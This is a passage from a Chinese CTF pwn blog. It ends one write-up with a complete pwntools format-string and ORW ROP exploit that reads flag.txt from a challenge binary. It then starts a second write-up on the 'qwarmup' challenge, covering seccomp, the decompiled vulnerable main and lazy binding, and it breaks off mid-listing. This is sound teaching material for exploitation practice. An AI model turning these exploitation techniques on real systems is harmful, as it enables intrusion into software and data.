class="line"></span><br><span class="line">tmp=start</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">    ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">    tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>当 1/16 的概率爆破成功后，下一次循环的 fmt 就可以修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2”，然后用 “%p” 就可以泄露出 libc_base</p>
<p>最后就可以通过 buffered_vfprintf 覆盖 printf 的返回地址，把一个特殊的 getget 写入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rsp,<span class="number">0x98</span>; ret;  </span><br></pre></td></tr></table></figure>
<ul>
<li>看看 printf 返回时的 stack 空间：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x7ffdb7a886f8</span> —▸ <span class="number">0x7fb53b3e2242</span> (__libc_check_standard_fds+<span class="number">82</span>) ◂— add    rsp, <span class="number">0x98</span></span><br><span class="line">*RIP  <span class="number">0x7fb53b41fd56</span> (<span class="built_in">printf</span>+<span class="number">198</span>) ◂— ret </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffdb7a88700</span>+<span class="number">0x98</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffdb7a88798</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffdb7a887a0</span> —▸ <span class="number">0x7ffdb7a88780</span> ◂— <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffdb7a887a8</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffdb7a887b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffdb7a887b8</span> —▸ <span class="number">0x7fb53b4cbce0</span> (open64) ◂— endbr64 </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffdb7a887c0</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffdb7a887c8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffdb7a887d0</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br></pre></td></tr></table></figure>
<ul>
<li>汇编指令 <code>add rsp,0x98; ret;</code> 完美衔接了 ORW 的 ROP 链</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x14B9)\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    pro_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">    success(<span class="string">&quot;pro_base: &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pro_base+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    start=pro_base+<span class="number">0x11a0</span></span><br><span class="line">    bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line">    <span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">        bit=bit+<span class="number">0xf0</span></span><br><span class="line">    off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">    ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span class="line"></span><br><span class="line">    tmp=start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">        ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">        tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    pre=<span class="number">0</span></span><br><span class="line">    fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">    data=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        min_num=<span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">            <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">                min_num=off[i]</span><br><span class="line">                min_idx=i</span><br><span class="line">        fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">        data+=p64(ptr[min_idx])</span><br><span class="line">        off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">        pre=min_num</span><br><span class="line"></span><br><span class="line">    r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;%2c%334$hhn;%334$p&quot;</span>.ljust(<span class="number">0x18</span>)+fmtstr_payload(<span class="number">9</span>, &#123;stack-<span class="number">0x2a8</span>:pro_base+<span class="number">0x11a0</span>&#125;, numbwritten=<span class="number">0x17</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="number">112</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,cmd)</span></span><br><span class="line">    add_rsp=libc_base+<span class="number">0x24242</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x36174</span></span><br><span class="line">    pop_rdi=pro_base+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">    open_libc=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">    read_libc=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    write_libc=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">    bss = pro_base+elf.bss()</span><br><span class="line">    payload=p64(pop_rdi)+p64(stack-<span class="number">0xb20</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(bss)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(bss)+p64(write_libc)</span><br><span class="line"></span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xba8</span>:add_rsp&#125;).ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+<span class="string">&quot;flag.txt&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&quot;\x00&quot;</span>)+payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        success(<span class="string">&quot;wrong&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<p>第一次接触这种 printf 盲打印，学到了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/" class="post-title-link" itemprop="url">dl_runtime_resolve attack+svcudp_reply控制栈</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-23 00:40:46 / Modified: 16:21:16" itemprop="dateCreated datePublished" datetime="2022-08-23T00:40:46+08:00">2022-08-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>qwarmup 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup file qwarmup          </span><br><span class="line">qwarmup: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">0</span>ee74cf51da29e8ecc9897c2a2a96b4ce87934be, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  qwarmup checksec qwarmup      </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/qwarmup/qwarmup&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，开了 PIE，开了 Canary，但是 GOT 可改（启用了延迟绑定）</li>
</ul>
<p>有沙盒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup seccomp-tools dump ./qwarmup1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> byte; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  read(<span class="number">0</span>, &amp;size, <span class="number">4uLL</span>);</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    offset = <span class="number">0LL</span>;</span><br><span class="line">    byte = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;offset, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;byte, <span class="number">1uLL</span>);</span><br><span class="line">    chunk[offset] = byte;                       <span class="comment">// 溢出？</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Success!&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">    HIWORD(key) = HIWORD(size);                 <span class="comment">// 大于0x10000的部分赋值key</span></span><br><span class="line">    LOWORD(key) = <span class="number">0</span>;                            <span class="comment">// 小于0x10000的部分置空</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !key );</span><br><span class="line">  _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>题目中会检查 size：<ul>
<li>如果 size 小于0x10000，可以循环写</li>
<li>如果 size 大于0x10000，只能写一次</li>
</ul>
</li>
</ul>
<p><strong>了解延迟绑定的细节</strong></p>
<p>延迟绑定机制：</p>
<ul>
<li>启用延迟绑定后，程序不会把库函数的真实地址绑定在 GOT 表中</li>
<li>当程序第一次调用该函数时，会先找到该函数对应的 PLT 表，然后跳转对应的 GOT 表</li>
<li>GOT 表中没有该函数的真实地址，而是会跳转回 PLT 表</li>
<li>在 PLT 表中：先 push 一个偏移（用于确定自身函数），然后在 PLT 表中进入共用的 PLT[0] 表</li>
<li>在 PLT[0] 表中：先 push <code>link_map</code>（为 <code>_dl_fixup</code> 提供信息），然后执行 <code>_dl_runtime_resolve_fxsave</code> 函数</li>
<li>接着使用 <code>_dl_fixup</code> 函数来查找目标在动态链接库中的地址</li>
<li>最后把对应 GOT 表地址修改为库函数的真实地址</li>
</ul>
<p><code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code> 接受两个参数，一个“链接映射”和一个“重定位索引”</p>
<ul>
<li>“链接映射”：将有关 ELF 的所有相关信息包装成一个数据结构 <code>link_map</code></li>
<li>“重定位索引”：用于确定该函数在 PLT/GOT 表中的位置</li>
</ul>
<p>结构体 <code>link_map</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span 